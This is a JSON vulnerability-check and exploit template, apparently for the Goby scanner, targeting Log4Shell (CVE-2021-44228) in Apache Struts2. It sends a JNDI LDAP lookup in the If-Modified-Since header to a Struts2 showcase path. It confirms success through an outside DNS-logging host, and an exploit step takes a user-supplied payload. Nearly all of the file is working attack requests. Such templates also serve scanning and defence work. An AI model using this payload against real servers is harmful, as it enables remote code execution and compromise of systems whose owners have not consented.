{
      "Name": "Struts2 Log4Shell CVE-2021-44228 (2) struts2",
      "Level": "3",
      "Tags": [
            "rce"
      ],
      "GobyQuery": "app=\"Struts2\"",
      "Description": "Struts2某些文件会记录If-Modified-Since信息，其存在log4j漏洞。",
      "Product": "Struts2",
      "Homepage": "https://struts.apache.org/",
      "Author": "aetkrad",
      "Impact": "",
      "Recommendation": "",
      "References": [
            "https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "cmd",
                  "Type": "input",
                  "Value": "${jndi:ldap://xxxxdnslog.cn/tes}"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "http://www.dnslog.cn/getdomain.php",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "dnstest|lastbody||"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/struts2-showcase/struts/utils.js",
                        "follow_redirect": false,
                        "header": {
                              "If-Modified-Since": "${jndi:ldap://{{{dnstest}}}/tes}"
                        },
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "http://www.dnslog.cn/getrecords.php",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "{{{dnstest}}}",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/struts2-showcase/struts/utils.js",
                        "follow_redirect": false,
                        "header": {
                              "If-Modified-Since": "${jndi:ldap://{{{cmd}}}/tes}"
                        },
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "2021-12-23 15:43:11",
      "GobyVersion": "1.9.310"
}